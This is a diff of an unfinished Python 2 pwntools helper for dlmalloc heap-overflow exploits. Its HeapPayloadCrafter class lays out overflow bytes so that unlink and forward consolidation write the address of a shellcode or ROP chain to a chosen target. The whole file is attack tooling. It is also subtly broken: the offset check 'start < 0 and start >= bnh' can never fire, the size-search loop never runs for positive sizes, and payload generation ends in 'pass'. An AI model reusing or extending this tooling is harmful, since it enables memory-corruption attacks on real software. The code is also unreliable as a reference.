@@ -1,65 +1,59 @@
 
 from pwn import *
 
+# TODO support for overwriting using forward consolidation
+# TODO support for overwriting using forward consolidation only
+# TODO support for overwriting using frontlink method
+
+"""
+Terminology :
+    Block that is being overwritten and later freed     :    "C"
+    Block that is 'before' C(our crafted block)         :    "BEFORE_C"
+    Block that is 'after'  C                            :    "AFTER_C"
+"""
+
 class HeaplibException(Exception):
     pass
 
-class CraftedMetadata(object):
-    """
-    Represents the 2 DWORDS that overwrite the metadata of a chunk
-    that is about to be freed.
-    """
-    def __init__(self, offset_to_prev_block=0xfffffff8, offset_to_next_block=0xfffffff0, CAC_prevsize=0xfffffff0, CAC_size=0xfffffff8):
-        self.PREV_SIZE = offset_to_prev_block
-        self.SIZE = offset_to_next_block
-
-    def __str__(self):
-        return pack(self.PREV_SIZE) + pack(self.SIZE)
-
-class CraftedBlock(object):
-    """
-    Represents a crafted chunk that is positioned to be previous
-    to the chunk that has been overflowed into and is subsequently
-    freed.
-    """
-    def __init__(self, source, destination, fake_prevsize=0xfffffff1, fake_size=0xfffffff1):
-        self.source = source
-        self.destination = destination
-        self.fake_prevsize = fake_prevsize
-        self.fake_size = fake_size
-
-    def __str__(self):
-        return pack(self.fake_prevsize) + pack(self.fake_size) + pack(self.source) + pack(self.destination)
-
-class HeapFrame(object):
-    def __init__(self, source, destination, **kwargs):
+class HeapPayloadCrafter(object):
+    def __init__(self, destination, source, **kw):
         """
-        source:       Address to which `destination` must be written out to.
-        destination:  Address of your shellcode/ROP chain. Note that *(destination+8)
-                      must be writable
+        destination    :   Address to which `source` must be written out to.
+        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
+                           must be writable
+        destination_2  :   Optional 2nd address to overwrite using forward consolidation.
         """
-        self.source = source
-        self.destination = destination
-        self.allocator = kwargs.get("allocator", "dlmalloc")
-        self.bytes_to_nextheader = kwargs.get("bytes_to_nextheader", None)
-        self.required_content = kwargs.get("required_content", {})
-        self.populating_character = kwargs.get("populating_character", "A")
+        self.destination          = destination
+        self.source               = source
+        self.destination_2        = kw.get("destination_2", None)
+        self.source_2             = kw.get("source_2", None)
+        self.allocator            = kw.get("allocator", "dlmalloc")
+        self.bytes_to_nextheader  = kw.get("bytes_to_nextheader", None)
+        self.preset_content       = kw.get("preset_content", {})
+        self.populating_character = kw.get("populating_character", "*")
 
-    def populate_content(self):
-        full_content = list(self.populating_character * self.bytes_to_nextheader)
-        for offset in self.required_content:
-            if offset < 0 or offset >= self.bytes_to_nextheader:
-                raise HeaplibException("Invalid offset when populating content")
-            content = self.required_content[offset]
-            start, end = offset, offset+len(content)
-            try:
-                assert full_content[start:end] == ["A"] * len(content)
-                full_content[start:end] = content
-            except AssertionError, e:
-                print start, end
-                print full_content[start:end]
-                print ["A"] * len(content)
-                raise e
+    def can_use(self, content, start, length):
+        return content[start: start+length] == [self.populating_character] * length
+
+    def populate_content(self, **kw):
+        # Facilitating testing
+        rc = kw.get("preset_content", self.preset_content)
+        bnh = kw.get("bytes_to_nextheader", self.bytes_to_nextheader)
+
+        full_content = [self.populating_character] * bnh
+        for offset in rc:
+            content = rc[offset]
+            start, end = offset, offset + len(content)
+
+            if start < 0 and start >= bnh:
+                raise HeaplibException("Invalid start offset when populating content")
+            elif end >= bnh:
+                raise HeaplibException("Invalid end offset when populating content")
+
+            if not self.can_use(full_content, start, len(content)):
+                raise HeaplibException("Offset (%d: %d) is already used" %(start, start+len(content)))
+            full_content[start:end] = content
+
         return full_content
 
     def generate_payload(self, content):
@@ -74,8 +68,11 @@ class HeapFrame(object):
         # We start off with trying to find values for SIZE, so that
         # control moves to our `next` chunk when dlmalloc attempts to
         # do forward consolidation.
-        SIZE_TO_OVERWRITE = 0
-
+        for SIZE_TO_OVERWRITE in xrange(-8, self.bytes_to_nextheader, -4):
+            # check if there is some content at that length
+            if self.can_use(content, SIZE_TO_OVERWRITE, 8):
+                # check if CAC can be placed somewhere before
+                pass
         pass
 
 
